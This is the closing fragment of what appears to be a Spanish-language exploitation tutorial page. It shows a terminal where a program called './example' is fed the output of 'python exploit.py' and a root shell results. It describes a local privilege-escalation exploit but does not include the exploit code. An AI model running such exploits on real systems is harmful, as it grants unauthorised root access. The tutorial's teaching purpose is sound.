<code><span class="s2">❯ ./example </span><span class="k">$(</span><span class="s2">python </span><span class="p">exploit.py</span><span class="k">)</span><span class="p">
bash-5.1# whoami
root
bash-5.1#</span>
</code></pre></div></div><br>

<p><a href="./../../">Página Principal</a></p>

      </section>
    </div>
  </body>
</html>
